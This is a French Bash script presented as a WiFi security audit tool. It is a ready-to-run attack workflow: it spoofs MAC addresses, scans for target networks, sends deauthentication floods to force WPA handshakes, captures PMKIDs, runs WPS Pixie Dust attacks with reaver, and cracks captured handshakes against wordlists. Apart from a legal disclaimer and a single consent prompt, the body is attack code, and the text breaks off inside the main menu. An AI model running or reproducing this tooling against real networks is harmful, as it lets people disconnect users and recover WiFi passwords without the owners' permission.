#!/usr/bin/env bash
#
# wifi_audit.sh — Script d'audit de sécurité WiFi interactif & automatisé
#
# ⚠️ AVERTISSEMENT LÉGAL ⚠️
# Ce script ne doit être utilisé QUE sur des réseaux WiFi dont vous êtes
# propriétaire, ou pour lesquels vous avez une autorisation écrite explicite.
# L'utilisateur est seul responsable de l'usage qu'il fait de cet outil.
# -----------------------------------------------------------------------

set -uo pipefail

# ==============================
# CONFIGURATION & COULEURS
# ==============================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m' # No Color

LOGDIR="$HOME/wifi_audit_logs/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOGDIR"

# Variables globales d'état
IFACE=""
MONIFACE=""
TARGET_BSSID=""
TARGET_ESSID=""
TARGET_CH=""
TARGET_ENC=""
TARGET_PWR=""
LAST_CAPFILE=""
SCAN_CSV_PREFIX="$LOGDIR/scan_live"

# Dépendances requises
REQUIRED_TOOLS=(iw airodump-ng airmon-ng aireplay-ng aircrack-ng macchanger)
OPTIONAL_TOOLS=(wifite reaver pixiewps hcxdumptool hcxpcapngtool xterm)

# ==============================
# FONCTIONS D'AFFICHAGE & LOGS
# ==============================
log()  { echo -e "${BLUE}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1"; }
info() { echo -e "${CYAN}[i]${NC} $1"; }

pause() {
    echo ""
    read -rp "Appuyez sur [Entrée] pour continuer..." _
}

# Bannière et barre d'état dynamique
draw_header() {
    clear
    echo -e "${CYAN}${BOLD}"
    cat << "EOF"
  __        ___ _____ _        _             _ _ _   
  \ \      / (_)  ___(_)      / \  _   _  __| (_) |_ 
   \ \ /\ / /| | |_  | |     / _ \| | | |/ _` | | __|
    \ V  V / | |  _| | |    / ___ \ |_| | (_| | | |_ 
     \_/\_/  |_|_|   |_|   /_/   \_\__,_|\__,_|_|\__|
EOF
    echo -e "${NC}            ${YELLOW}Audit & Analyse de Sécurité Sans-Fil${NC}"
    echo -e "${BLUE}========================================================================${NC}"
    
    # État de l'interface
    if [[ -n "$MONIFACE" ]]; then
        echo -e "  📡 ${BOLD}Interface:${NC} ${GREEN}$IFACE${NC} | ${BOLD}Monitor:${NC} ${GREEN}$MONIFACE (Actif)${NC}"
    elif [[ -n "$IFACE" ]]; then
        echo -e "  📡 ${BOLD}Interface:${NC} ${YELLOW}$IFACE${NC} | ${BOLD}Monitor:${NC} ${RED}Inactif${NC}"
    else
        echo -e "  📡 ${BOLD}Interface:${NC} ${RED}Non sélectionnée${NC}"
    fi

    # État de la cible
    if [[ -n "$TARGET_BSSID" ]]; then
        local essid_disp="${TARGET_ESSID:-<Masqué>}"
        echo -e "  🎯 ${BOLD}Cible Active:${NC} ${GREEN}$essid_disp${NC} [BSSID: ${CYAN}$TARGET_BSSID${NC} | Canal: ${YELLOW}$TARGET_CH${NC} | Sec: ${MAGENTA}$TARGET_ENC${NC}]"
    else
        echo -e "  🎯 ${BOLD}Cible Active:${NC} ${YELLOW}Aucune (Scannez et sélectionnez un réseau)${NC}"
    fi

    echo -e "  📁 ${BOLD}Session logs:${NC} $LOGDIR"
    echo -e "${BLUE}========================================================================${NC}"
}

# ==============================
# VÉRIFICATIONS SYSTÈME
# ==============================
check_root() {
    if [[ $EUID -ne 0 ]]; then
        err "Ce script doit être exécuté avec les privilèges root (sudo)."
        exit 1
    fi
}

check_consent() {
    draw_header
    warn "AVERTISSEMENT LÉGAL :"
    echo "Ce programme est destiné uniquement à l'audit et à l'analyse de réseaux"
    echo "pour lesquels vous disposez d'une autorisation explicite de test."
    echo ""
    read -rp "Confirmez-vous détenir l'autorisation légale nécessaire ? (oui/non) : " CONSENT
    if [[ "$CONSENT" != "oui" && "$CONSENT" != "o" ]]; then
        err "Consentement non confirmé. Arrêt du programme."
        exit 1
    fi
}

check_deps() {
    draw_header
    echo -e "${BOLD}--- VÉRIFICATION DES OUTILS ---${NC}\n"
    
    local missing_req=()
    local missing_opt=()

    log "Vérification des outils indispensables..."
    for tool in "${REQUIRED_TOOLS[@]}"; do
        if command -v "$tool" &>/dev/null; then
            ok "  ✓ $tool"
        else
            err "  ✗ $tool (Requis)"
            missing_req+=("$tool")
        fi
    done

    echo ""
    log "Vérification des outils optionnels..."
    for tool in "${OPTIONAL_TOOLS[@]}"; do
        if command -v "$tool" &>/dev/null; then
            ok "  ✓ $tool"
        else
            warn "  ⚠ $tool (Optionnel)"
            missing_opt+=("$tool")
        fi
    done

    if [[ ${#missing_req[@]} -gt 0 || ${#missing_opt[@]} -gt 0 ]]; then
        echo ""
        read -rp "Voulez-vous tenter d'installer les outils manquants via apt ? (o/n) : " INSTALL_CHOICE
        if [[ "$INSTALL_CHOICE" =~ ^[oOyY]$ ]]; then
            log "Mise à jour des paquets et installation..."
            apt update
            apt install -y aircrack-ng wifite reaver pixiewps hcxdumptool hcxtools macchanger xterm wireless-tools iw
            ok "Installation terminée."
        fi
    fi
    pause
}

# ==============================
# GESTION DES INTERFACES
# ==============================
get_wireless_interfaces() {
    # Récupération propre des interfaces sans fil
    iw dev 2>/dev/null | awk '$1=="Interface"{print $2}'
}

select_interface() {
    draw_header
    echo -e "${BOLD}--- SÉLECTION DE L'INTERFACE SANS FIL ---${NC}\n"
    
    local ifaces=()
    while IFS= read -r iface_name; do
        [[ -n "$iface_name" ]] && ifaces+=("$iface_name")
    done < <(get_wireless_interfaces)

    if [[ ${#ifaces[@]} -eq 0 ]]; then
        err "Aucune interface sans-fil détectée sur le système !"
        info "Vérifiez que votre adaptateur WiFi est branché et supporté."
        pause
        return
    fi

    echo "Interfaces sans fil disponibles :"
    for i in "${!ifaces[@]}"; do
        local ifc="${ifaces[$i]}"
        local mac
        mac=$(cat "/sys/class/net/$ifc/address" 2>/dev/null || echo "inconnue")
        local driver
        driver=$(ethtool -i "$ifc" 2>/dev/null | awk -F': ' '$1=="driver"{print $2}' || echo "N/A")
        echo -e "  [${GREEN}$((i + 1))${NC}] ${BOLD}$ifc${NC} (MAC: $mac | Driver: $driver)"
    done
    echo -e "  [${YELLOW}0${NC}] Retour au menu principal"
    echo ""

    read -rp "Sélectionnez une interface [1-${#ifaces[@]}] : " choice
    if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#ifaces[@]} )); then
        IFACE="${ifaces[$((choice - 1))]}"
        # Vérifie si l'interface est déjà en mode monitor
        if iw dev "$IFACE" info 2>/dev/null | grep -q "type monitor"; then
            MONIFACE="$IFACE"
            ok "Interface sélectionnée : $IFACE (Déjà en mode monitor)"
        else
            MONIFACE=""
            ok "Interface sélectionnée : $IFACE"
        fi
    elif [[ "$choice" == "0" || "$choice" == "r" ]]; then
        return
    else
        err "Choix invalide."
    fi
    pause
}

enable_monitor() {
    draw_header
    echo -e "${BOLD}--- ACTIVATION DU MODE MONITOR ---${NC}\n"

    if [[ -z "$IFACE" ]]; then
        warn "Aucune interface sélectionnée. Sélection automatique..."
        select_interface
        [[ -z "$IFACE" ]] && return
    fi

    log "Nettoyage des processus réseau conflictuels (airmon-ng check kill)..."
    airmon-ng check kill > "$LOGDIR/airmon_kill.log" 2>&1 || true

    log "Activation du mode monitor sur $IFACE..."
    airmon-ng start "$IFACE" > "$LOGDIR/airmon_start.log" 2>&1

    # Détection intelligente de l'interface monitor créée
    local detected_mon=""
    detected_mon=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | grep -E "${IFACE}mon|mon[0-9]|${IFACE}" | head -n1)

    if [[ -n "$detected_mon" ]] && iw dev "$detected_mon" info 2>/dev/null | grep -q "type monitor"; then
        MONIFACE="$detected_mon"
        ok "Mode monitor activé avec succès sur : ${GREEN}$MONIFACE${NC}"
    else
        # Tentative manuelle iw
        ip link set "$IFACE" down 2>/dev/null || true
        iw "$IFACE" set type monitor 2>/dev/null || true
        ip link set "$IFACE" up 2>/dev/null || true
        if iw dev "$IFACE" info 2>/dev/null | grep -q "type monitor"; then
            MONIFACE="$IFACE"
            ok "Mode monitor activé via iw sur : ${GREEN}$MONIFACE${NC}"
        else
            err "Échec de l'activation du mode monitor sur $IFACE."
        fi
    fi
    pause
}

disable_monitor() {
    draw_header
    echo -e "${BOLD}--- DÉSACTIVATION DU MODE MONITOR ---${NC}\n"

    local target_to_stop="${MONIFACE:-$IFACE}"
    if [[ -n "$target_to_stop" ]]; then
        log "Arrêt du mode monitor sur $target_to_stop..."
        airmon-ng stop "$target_to_stop" > "$LOGDIR/airmon_stop.log" 2>&1 || true
        ip link set "$IFACE" down 2>/dev/null || true
        iw "$IFACE" set type managed 2>/dev/null || true
        ip link set "$IFACE" up 2>/dev/null || true
    fi

    MONIFACE=""
    log "Redémarrage des services réseau (NetworkManager / wpa_supplicant)..."
    systemctl restart NetworkManager 2>/dev/null || service NetworkManager restart 2>/dev/null || true
    ok "Mode monitor désactivé et services réseau restaurés."
    pause
}

change_mac() {
    draw_header
    echo -e "${BOLD}--- GESTION DE L'ADRESSE MAC ---${NC}\n"

    local current_iface="${IFACE:-}"
    if [[ -z "$current_iface" ]]; then
        warn "Veuillez d'abord sélectionner une interface."
        pause
        return
    fi

    echo "1) Générer une adresse MAC aléatoire"
    echo "2) Spécifier une adresse MAC personnalisée"
    echo "3) Restaurer l'adresse MAC d'origine"
    echo "0) Annuler"
    echo ""
    read -rp "Choix : " mac_opt

    case "$mac_opt" in
        1)
            ip link set "$current_iface" down
            macchanger -r "$current_iface" | tee "$LOGDIR/mac_change.log"
            ip link set "$current_iface" up
            ok "Nouvelle adresse MAC aléatoire appliquée !"
            ;;
        2)
            read -rp "Entrez la MAC voulue (ex: 00:11:22:33:44:55) : " custom_mac
            if [[ "$custom_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                ip link set "$current_iface" down
                macchanger -m "$custom_mac" "$current_iface" | tee "$LOGDIR/mac_change.log"
                ip link set "$current_iface" up
                ok "Adresse MAC personnalisée appliquée !"
            else
                err "Format MAC invalide."
            fi
            ;;
        3)
            ip link set "$current_iface" down
            macchanger -p "$current_iface" | tee "$LOGDIR/mac_change.log"
            ip link set "$current_iface" up
            ok "Adresse MAC permanente restaurée."
            ;;
        *)
            return
            ;;
    esac
    pause
}

# ==============================
# SCAN & SÉLECTION AUTOMATIQUE
# ==============================
ensure_monitor_active() {
    if [[ -z "$MONIFACE" ]]; then
        warn "Le mode monitor n'est pas activé."
        read -rp "Voulez-vous l'activer maintenant ? (o/n) : " opt
        if [[ "$opt" =~ ^[oOyY]$ ]]; then
            enable_monitor
        else
            return 1
        fi
    fi
    return 0
}

scan_and_select_target() {
    ensure_monitor_active || return

    draw_header
    echo -e "${BOLD}--- SCAN ET SÉLECTION AUTOMATIQUE DU RÉSEAU CIBLE ---${NC}\n"
    echo "Choisissez le mode de scan :"
    echo "  [1] Scan rapide chronométré (15 secondes)"
    echo "  [2] Scan complet chronométré (30 secondes)"
    echo "  [3] Scan interactif continu (Arrêt avec Ctrl+C quand vous voulez)"
    echo "  [0] Annuler"
    echo ""
    read -rp "Votre choix [1-3] : " scan_mode

    local scan_duration=0
    case "$scan_mode" in
        1) scan_duration=15 ;;
        2) scan_duration=30 ;;
        3) scan_duration=0 ;;
        0|r) return ;;
        *) err "Choix invalide"; pause; return ;;
    esac

    # Nettoyage des anciens scans
    rm -f "${SCAN_CSV_PREFIX}"*

    log "Lancement d'airodump-ng sur ${GREEN}$MONIFACE${NC}..."
    if [[ $scan_duration -gt 0 ]]; then
        info "Scan en cours pendant $scan_duration secondes... Patientez..."
        timeout --foreground "$scan_duration" airodump-ng "$MONIFACE" \
            --write "$SCAN_CSV_PREFIX" --output-format csv >/dev/null 2>&1 || true
    else
        info "Scan en direct. Appuyez sur [Ctrl+C] dès que votre cible apparaît dans la liste."
        sleep 2
        airodump-ng "$MONIFACE" --write "$SCAN_CSV_PREFIX" --output-format csv || true
    fi

    local csv_file="${SCAN_CSV_PREFIX}-01.csv"
    if [[ ! -f "$csv_file" ]]; then
        err "Aucun résultat de scan disponible."
        pause
        return
    fi

    # Parsing du CSV airodump-ng
    # Format airodump CSV AP section : BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
    local ap_list=()
    local bssids=()
    local channels=()
    local privacies=()
    local powers=()
    local essids=()

    local in_ap_section=true
    while IFS=, read -r bssid ftime ltime ch speed priv cipher auth pwr beacons iv lan idlen essid key || [[ -n "$bssid" ]]; do
        # Nettoyage des espaces et retours chariot
        bssid=$(echo "$bssid" | tr -d ' \r\n"')
        ch=$(echo "$ch" | tr -d ' \r\n"')
        priv=$(echo "$priv" | tr -d ' \r\n"')
        pwr=$(echo "$pwr" | tr -d ' \r\n"')
        essid=$(echo "$essid" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' -e 's/\r//g' -e 's/"//g')

        # Détection du passage à la section Clients
        if [[ "$bssid" == "StationMAC" ]]; then
            in_ap_section=false
            break
        fi

        # Filtre les en-têtes et lignes non BSSID
        if [[ "$in_ap_section" == true && "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            bssids+=("$bssid")
            channels+=("$ch")
            privacies+=("$priv")
            powers+=("$pwr")
            essids+=("${essid:-<Masqué>}")
        fi
    done < "$csv_file"

    local total_aps=${#bssids[@]}
    if [[ $total_aps -eq 0 ]]; then
        warn "Aucun point d'accès n'a été détecté lors de ce scan."
        pause
        return
    fi

    draw_header
    echo -e "${BOLD}--- RÉSEAUX WIFI DÉTECTÉS ($total_aps) ---${NC}\n"
    printf "${BOLD}%-5s %-19s %-5s %-6s %-14s %-25s${NC}\n" "NUM" "BSSID" "CH" "PWR" "SÉCURITÉ" "ESSID"
    echo "------------------------------------------------------------------------"

    for i in "${!bssids[@]}"; do
        local num=$((i + 1))
        local b="${bssids[$i]}"
        local c="${channels[$i]}"
        local p="${powers[$i]}"
        local sec="${privacies[$i]}"
        local e="${essids[$i]}"
        
        # Coloration selon la puissance du signal
        local pwr_col="$GREEN"
        if [[ "$p" -lt -75 ]]; then
            pwr_col="$RED"
        elif [[ "$p" -lt -60 ]]; then
            pwr_col="$YELLOW"
        fi

        printf "[%2d]  %-19s %-5s ${pwr_col}%-6s${NC} %-14s ${BOLD}%-25s${NC}\n" \
            "$num" "$b" "$c" "$p" "$sec" "$e"
    done

    echo "------------------------------------------------------------------------"
    echo -e "  [${YELLOW}0${NC}] Annuler et revenir au menu"
    echo ""

    read -rp "Sélectionnez le numéro du réseau cible [1-$total_aps] : " ap_choice
    if [[ "$ap_choice" =~ ^[0-9]+$ ]] && (( ap_choice >= 1 && ap_choice <= total_aps )); then
        local idx=$((ap_choice - 1))
        TARGET_BSSID="${bssids[$idx]}"
        TARGET_CH="${channels[$idx]}"
        TARGET_ENC="${privacies[$idx]}"
        TARGET_PWR="${powers[$idx]}"
        TARGET_ESSID="${essids[$idx]}"

        ok "Cible enregistrée avec succès !"
        echo -e "  ESSID    : ${GREEN}$TARGET_ESSID${NC}"
        echo -e "  BSSID    : ${CYAN}$TARGET_BSSID${NC}"
        echo -e "  Canal    : ${YELLOW}$TARGET_CH${NC}"
        echo -e "  Sécurité : ${MAGENTA}$TARGET_ENC${NC}"
    else
        info "Sélection annulée."
    fi
    pause
}

# ==============================
# SÉLECTION DES CLIENTS CONNECTÉS
# ==============================
get_target_clients() {
    local csv_file="${SCAN_CSV_PREFIX}-01.csv"
    local clients=()

    if [[ ! -f "$csv_file" ]]; then
        return
    fi

    local in_clients_section=false
    while IFS=, read -r c_mac ftime ltime pwr packets bssid_assoc probed || [[ -n "$c_mac" ]]; do
        c_mac=$(echo "$c_mac" | tr -d ' \r\n"')
        bssid_assoc=$(echo "$bssid_assoc" | tr -d ' \r\n"')
        pwr=$(echo "$pwr" | tr -d ' \r\n"')
        packets=$(echo "$packets" | tr -d ' \r\n"')

        if [[ "$c_mac" == "StationMAC" ]]; then
            in_clients_section=true
            continue
        fi

        if [[ "$in_clients_section" == true && "$c_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            if [[ "$bssid_assoc" == "$TARGET_BSSID" ]]; then
                clients+=("$c_mac (Signal: ${pwr}dBm, Paquets: $packets)")
            fi
        fi
    done < "$csv_file"

    for c in "${clients[@]}"; do
        echo "$c"
    done
}

# ==============================
# ATTAQUES & CAPTURES
# ==============================
ensure_target_selected() {
    if [[ -z "$TARGET_BSSID" || -z "$TARGET_CH" ]]; then
        warn "Aucun réseau cible n'est sélectionné."
        read -rp "Voulez-vous scanner et sélectionner un réseau maintenant ? (o/n) : " opt
        if [[ "$opt" =~ ^[oOyY]$ ]]; then
            scan_and_select_target
            [[ -z "$TARGET_BSSID" ]] && return 1
        else
            return 1
        fi
    fi
    return 0
}

capture_handshake() {
    ensure_monitor_active || return
    ensure_target_selected || return

    draw_header
    echo -e "${BOLD}--- CAPTURE DE HANDSHAKE WPA/WPA2 (AVEC DÉAUTHENTIFICATION) ---${NC}\n"
    echo -e "Cible : ${GREEN}$TARGET_ESSID${NC} (${CYAN}$TARGET_BSSID${NC}) sur le canal ${YELLOW}$TARGET_CH${NC}"
    echo ""

    # Détection des clients associés
    local client_list=()
    while IFS= read -r line; do
        [[ -n "$line" ]] && client_list+=("$line")
    done < <(get_target_clients)

    local target_client=""
    if [[ ${#client_list[@]} -gt 0 ]]; then
        echo -e "${BOLD}Clients connectés détectés pour cette cible :${NC}"
        echo -e "  [${GREEN}0${NC}] ${BOLD}Déauthentification Broadcast (Tous les clients)${NC}"
        for idx in "${!client_list[@]}"; do
            echo -e "  [${GREEN}$((idx + 1))${NC}] ${client_list[$idx]}"
        done
        echo ""
        read -rp "Sélectionnez le client à déconnecter [0-${#client_list[@]}] (défaut: 0) : " c_choice
        c_choice="${c_choice:-0}"
        if [[ "$c_choice" =~ ^[0-9]+$ ]] && (( c_choice >= 1 && c_choice <= ${#client_list[@]} )); then
            target_client=$(echo "${client_list[$((c_choice - 1))]}" | awk '{print $1}')
            ok "Client spécifique ciblé : $target_client"
        else
            info "Ciblage global (Broadcast)."
        fi
    else
        info "Aucun client spécifique trouvé dans le dernier scan. Mode Broadcast utilisé."
    fi

    local out_prefix="$LOGDIR/handshake_$(echo "$TARGET_BSSID" | tr -d ':')"
    local cap_file="${out_prefix}-01.cap"
    rm -f "${out_prefix}"*

    # Verrouillage du canal
    log "Calibrage de l'interface sur le canal $TARGET_CH..."
    iw dev "$MONIFACE" set channel "$TARGET_CH" 2>/dev/null || airmon-ng start "$MONIFACE" "$TARGET_CH" >/dev/null 2>&1 || true

    # Lancement de la capture airodump-ng en arrière-plan
    log "Lancement de l'écoute airodump-ng..."
    airodump-ng -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$out_prefix" --output-format pcap,csv "$MONIFACE" >/dev/null 2>&1 &
    local airodump_pid=$!

    sleep 2

    # Envoi de la déauthentification
    log "Envoi des paquets de déauthentification (aireplay-ng)..."
    if [[ -n "$target_client" ]]; then
        aireplay-ng --deauth 7 -a "$TARGET_BSSID" -c "$target_client" "$MONIFACE" || true
    else
        aireplay-ng --deauth 7 -a "$TARGET_BSSID" "$MONIFACE" || true
    fi

    # Boucle de vérification automatique du Handshake
    log "Écoute active du Handshake WPA..."
    info "Attente de la reconnexion du client (environ 15 secondes)..."
    
    local handshake_found=false
    for _ in {1..15}; do
        sleep 1
        echo -n "."
        if [[ -f "$cap_file" ]] && aircrack-ng "$cap_file" 2>&1 | grep -q "1 handshake"; then
            handshake_found=true
            break
        fi
    done
    echo ""

    # Arrêt d'airodump-ng
    kill "$airodump_pid" 2>/dev/null || true
    wait "$airodump_pid" 2>/dev/null || true

    if [[ "$handshake_found" == true ]]; then
        ok "🏆 HANDSHAKE CAPTURÉ AVEC SUCCÈS !"
        ok "Fichier de capture : ${GREEN}$cap_file${NC}"
        LAST_CAPFILE="$cap_file"
    else
        warn "Handshake non détecté automatiquement."
        if [[ -f "$cap_file" ]]; then
            info "Vérification manuelle avec aircrack-ng..."
            aircrack-ng "$cap_file" | tee "$LOGDIR/check_handshake.log"
            LAST_CAPFILE="$cap_file"
        fi
    fi
    pause
}

capture_pmkid() {
    ensure_monitor_active || return

    draw_header
    echo -e "${BOLD}--- CAPTURE PMKID (HCXDUMPTOOL - SANS CLIENT) ---${NC}\n"
    
    if ! command -v hcxdumptool &>/dev/null; then
        err "hcxdumptool n'est pas installé."
        pause
        return
    fi

    read -rp "Durée de la capture PMKID en secondes (ex: 60) [défaut: 45] : " duration
    duration="${duration:-45}"

    local pcap_out="$LOGDIR/pmkid_$(date +%s).pcapng"
    local hash_out="$LOGDIR/pmkid_hashes.22000"

    log "Lancement de hcxdumptool pendant $duration secondes..."
    timeout "$duration" hcxdumptool -i "$MONIFACE" -o "$pcap_out" --enable_status=1 || true

    if [[ -f "$pcap_out" ]]; then
        ok "Capture enregistrée : $pcap_out"
        log "Extraction des hashs PMKID (format hashcat 22000)..."
        
        if command -v hcxpcapngtool &>/dev/null; then
            hcxpcapngtool -o "$hash_out" "$pcap_out" || true
        elif command -v hcxhashtool &>/dev/null; then
            hcxhashtool -i "$pcap_out" -o "$hash_out" --format=22000 || true
        fi

        if [[ -s "$hash_out" ]]; then
            ok "🎉 PMKID trouvé et extrait dans : ${GREEN}$hash_out${NC}"
        else
            warn "Aucun PMKID extrait lors de cette session."
        fi
    else
        err "Aucun paquet capturé."
    fi
    pause
}

wps_attack() {
    ensure_monitor_active || return
    ensure_target_selected || return

    draw_header
    echo -e "${BOLD}--- ATTAQUE WPS PIXIE DUST (REAVER / PIXIEWPS) ---${NC}\n"
    echo -e "Cible : ${GREEN}$TARGET_ESSID${NC} (${CYAN}$TARGET_BSSID${NC}) | Canal : ${YELLOW}$TARGET_CH${NC}"
    echo ""

    if ! command -v reaver &>/dev/null; then
        err "reaver n'est pas installé."
        pause
        return
    fi

    log "Lancement de reaver avec l'option Pixie Dust (-K 1)..."
    reaver -i "$MONIFACE" -b "$TARGET_BSSID" -c "$TARGET_CH" -K 1 -vv \
        2>&1 | tee "$LOGDIR/reaver_pixie_$(echo "$TARGET_BSSID" | tr -d ':').log"
    
    pause
}

run_wifite() {
    ensure_monitor_active || return

    draw_header
    echo -e "${BOLD}--- LANCEMENT DE WIFITE (MODE AUTOMATISÉ) ---${NC}\n"
    
    if ! command -v wifite &>/dev/null; then
        err "wifite n'est pas installé."
        pause
        return
    fi

    log "Démarrage de wifite sur $MONIFACE..."
    wifite -i "$MONIFACE" 2>&1 | tee "$LOGDIR/wifite_session.log"
    pause
}

# ==============================
# SÉLECTION AUTOMATIQUE FICHIERS & WORDLISTS
# ==============================
select_cap_file() {
    local caps=()
    # Recherche des .cap dans le dossier de log actuel et home
    while IFS= read -r f; do
        [[ -f "$f" ]] && caps+=("$f")
    done < <(find "$LOGDIR" -maxdepth 2 -name "*.cap" 2>/dev/null)

    if [[ -n "$LAST_CAPFILE" && -f "$LAST_CAPFILE" ]]; then
        # Place le dernier cap en premier si pas déjà listé
        if [[ ! " ${caps[*]} " =~ " ${LAST_CAPFILE} " ]]; then
            caps=("$LAST_CAPFILE" "${caps[@]}")
        fi
    fi

    echo -e "${BOLD}Sélection du fichier de capture (.cap) :${NC}"
    if [[ ${#caps[@]} -gt 0 ]]; then
        for i in "${!caps[@]}"; do
            echo -e "  [${GREEN}$((i + 1))${NC}] ${caps[$i]}"
        done
    fi
    echo -e "  [${YELLOW}m${NC}] Entrer manuellement un autre chemin"
    echo -e "  [${YELLOW}0${NC}] Annuler"
    echo ""

    read -rp "Choix : " cap_pick
    if [[ "$cap_pick" =~ ^[0-9]+$ ]] && (( cap_pick >= 1 && cap_pick <= ${#caps[@]} )); then
        SELECTED_CAP="${caps[$((cap_pick - 1))]}"
    elif [[ "$cap_pick" == "m" || "$cap_pick" == "M" ]]; then
        read -rp "Chemin absolu du fichier .cap : " SELECTED_CAP
    else
        SELECTED_CAP=""
    fi
}

select_wordlist() {
    local lists=()
    local common_lists=(
        "/usr/share/wordlists/rockyou.txt"
        "/usr/share/wordlists/rockyou.txt.gz"
        "/usr/share/wordlists/fasttrack.txt"
        "/usr/share/john/password.lst"
        "/usr/share/wordlists/metasploit/password.lst"
    )

    for wl in "${common_lists[@]}"; do
        if [[ -f "$wl" ]]; then
            lists+=("$wl")
        fi
    done

    echo -e "${BOLD}Sélection de la Wordlist (Dictionnaire) :${NC}"
    if [[ ${#lists[@]} -gt 0 ]]; then
        for i in "${!lists[@]}"; do
            echo -e "  [${GREEN}$((i + 1))${NC}] ${lists[$i]}"
        done
    fi
    echo -e "  [${YELLOW}m${NC}] Entrer manuellement un autre chemin de dictionnaire"
    echo -e "  [${YELLOW}0${NC}] Annuler"
    echo ""

    read -rp "Choix : " wl_pick
    if [[ "$wl_pick" =~ ^[0-9]+$ ]] && (( wl_pick >= 1 && wl_pick <= ${#lists[@]} )); then
        SELECTED_WL="${lists[$((wl_pick - 1))]}"
        # Décompression automatique si rockyou.txt.gz
        if [[ "$SELECTED_WL" == *.gz ]]; then
            local decompressed="/usr/share/wordlists/rockyou.txt"
            if [[ ! -f "$decompressed" ]]; then
                log "Décompression de $SELECTED_WL..."
                gunzip -k "$SELECTED_WL" 2>/dev/null || gzip -d -c "$SELECTED_WL" > "$decompressed"
                SELECTED_WL="$decompressed"
            fi
        fi
    elif [[ "$wl_pick" == "m" || "$wl_pick" == "M" ]]; then
        read -rp "Chemin absolu du dictionnaire : " SELECTED_WL
    else
        SELECTED_WL=""
    fi
}

crack_handshake() {
    draw_header
    echo -e "${BOLD}--- CRACKING DE HANDSHAKE (AIRCRACK-NG) ---${NC}\n"

    local SELECTED_CAP=""
    local SELECTED_WL=""

    select_cap_file
    if [[ -z "$SELECTED_CAP" || ! -f "$SELECTED_CAP" ]]; then
        err "Fichier .cap non sélectionné ou introuvable."
        pause
        return
    fi

    echo ""
    select_wordlist
    if [[ -z "$SELECTED_WL" || ! -f "$SELECTED_WL" ]]; then
        err "Dictionnaire non sélectionné ou introuvable."
        pause
        return
    fi

    log "Lancement d'aircrack-ng..."
    echo -e "  Capture  : ${GREEN}$SELECTED_CAP${NC}"
    echo -e "  Wordlist : ${CYAN}$SELECTED_WL${NC}"
    if [[ -n "$TARGET_BSSID" ]]; then
        echo -e "  Filtre BSSID : ${YELLOW}$TARGET_BSSID${NC}"
        aircrack-ng -w "$SELECTED_WL" -b "$TARGET_BSSID" "$SELECTED_CAP" | tee "$LOGDIR/crack_result.log"
    else
        aircrack-ng -w "$SELECTED_WL" "$SELECTED_CAP" | tee "$LOGDIR/crack_result.log"
    fi
    pause
}

verify_handshake() {
    draw_header
    echo -e "${BOLD}--- VÉRIFICATION DE VALIDITÉ D'UN HANDSHAKE ---${NC}\n"
    
    local SELECTED_CAP=""
    select_cap_file
    if [[ -z "$SELECTED_CAP" || ! -f "$SELECTED_CAP" ]]; then
        err "Fichier de capture introuvable."
        pause
        return
    fi

    log "Analyse des paquets WPA dans : $SELECTED_CAP"
    aircrack-ng "$SELECTED_CAP"
    pause
}

# ==============================
# SOUS-MENUS THÉMATIQUES
# ==============================
submenu_interfaces() {
    while true; do
        draw_header
        echo -e "${BOLD}=== GESTION DE L'INTERFACE & MODE MONITOR ===${NC}\n"
        echo "  [1] Sélectionner une interface WiFi"
        echo "  [2] Activer le mode monitor"
        echo "  [3] Désactiver le mode monitor & restaurer NetworkManager"
        echo "  [4] Changer l'adresse MAC (Aléatoire / Perso / Reset)"
        echo "  [0] Retour au menu principal"
        echo ""
        read -rp "Choix : " opt
        case "$opt" in
            1) select_interface ;;
            2) enable_monitor ;;
            3) disable_monitor ;;
            4) change_mac ;;
            0|r|R) break ;;
            *) err "Option invalide."; pause ;;
        esac
    done
}

submenu_attacks() {
    while true; do
        draw_header
        echo -e "${BOLD}=== ATTAQUES & CAPTURES SUR LA CIBLE ACTIVE ===${NC}\n"
        echo "  [1] Capturer un Handshake WPA/WPA2 (Déauth ciblée ou broadcast)"
        echo "  [2] Capturer un PMKID sans client (hcxdumptool)"
        echo "  [3] Attaque WPS Pixie Dust (Reaver + Pixiewps)"
        echo "  [4] Lancer Wifite (Audit complet automatisé)"
        echo "  [0] Retour au menu principal"
        echo ""
        read -rp "Choix : " opt
        case "$opt" in
            1) capture_handshake ;;
            2) capture_pmkid ;;
            3) wps_attack ;;
            4) run_wifite ;;
            0|r|R) break ;;
            *) err "Option invalide."; pause ;;
        esac
    done
}

submenu_cracking() {
    while true; do
        draw_header
        echo -e "${BOLD}=== CRACKING & ANALYSE DE CAPTURES ===${NC}\n"
        echo "  [1] Vérifier la présence d'un handshake dans un fichier .cap"
        echo "  [2] Cracker un handshake WPA/WPA2 avec dictionnaire"
        echo "  [0] Retour au menu principal"
        echo ""
        read -rp "Choix : " opt
        case "$opt" in
            1) verify_handshake ;;
            2) crack_handshake ;;
            0|r|R) break ;;
            *) err "Option invalide."; pause ;;
        esac
    done
}

# ==============================
# MENU PRINCIPAL & GESTION EXIT
# ==============================
cleanup_on_exit() {
    echo ""
    log "Nettoyage avant fermeture..."
    # Nettoie les processus résiduels de scan si existants
    pkill -f "airodump-ng.*$SCAN_CSV_PREFIX" 2>/dev/null || true
}

trap cleanup_on_exit EXIT

main_menu() {
    while true; do
        draw_header
        echo -e "${BOLD}=== MENU PRINCIPAL ===${NC}\n"
        echo "  [1] 📡 Gestion Interface & Mode Monitor"
        echo "  [2] 🔍 Scanner & Sélectionner un Réseau Cible (Auto)"
